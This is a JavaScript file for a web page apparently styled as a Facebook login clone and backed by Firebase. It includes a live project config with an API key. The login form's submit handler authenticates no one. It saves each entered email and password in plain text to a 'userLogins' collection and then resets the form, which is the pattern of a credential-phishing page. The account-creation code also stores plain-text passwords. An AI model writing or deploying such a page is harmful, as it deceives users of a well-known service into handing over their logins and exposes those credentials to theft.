// 🔹 Import Firebase functions
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-firestore.js";

// 🔹 Your Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyB2whMq8yykyvH5MVkMjYn09eGFHrDCw8Q",
  authDomain: "facebook-clone-e6dd9.firebaseapp.com",
  projectId: "facebook-clone-e6dd9",
  storageBucket: "facebook-clone-e6dd9.firebasestorage.app",
  messagingSenderId: "914544424092",
  appId: "1:914544424092:web:86c4da642da4e382596959",
  measurementId: "G-PRQ8R9G63S"
};

// 🔹 Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// 🔹 Handle Login Form Submit
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("⚠️ Please fill in both fields.");
    return;
  }

  try {
    await addDoc(collection(db, "userLogins"), {
      email: email,
      password: password, // ⚠️ plain text
      timestamp: serverTimestamp()
    });
    document.getElementById("loginForm").reset();
  } catch (error) {
    console.error("❌ Error saving login:", error);
  }
});

// 🔹 Handle Create Account Button
document.querySelector(".create-btn").addEventListener("click", async () => {
  const name = prompt("Enter your name:");
  const email = prompt("Enter your email:");
  const password = prompt("Enter your password:");

  if (!name || !email || !password) {
    alert("⚠️ All fields are required to create an account.");
    return;
  }

  try {
    await addDoc(collection(db, "userAccounts"), {
      name: name,
      email: email,
      password: password, // ⚠️ plain text
      createdAt: serverTimestamp()
    });
    alert("🎉 Account created & saved in Firebase Firestore!");
  } catch (error) {
    console.error("❌ Error creating account:", error);
    alert("❌ Failed to create account.");
  }
});

// 🔹 Password Show/Hide Toggle
const passwordInput = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");

// Set default password type to "password" (hidden)
passwordInput.type = "password";
togglePassword.textContent = "👁️"; // Eye icon for show

togglePassword.addEventListener("click", () => {
  if (passwordInput.type === "password") {
    passwordInput.type = "text";      // Show password
    togglePassword.textContent = "👁️"; // Eye closed icon
  } else {
    passwordInput.type = "password";  // Hide password
    togglePassword.textContent = "👁️"; // Eye open icon
  }
});
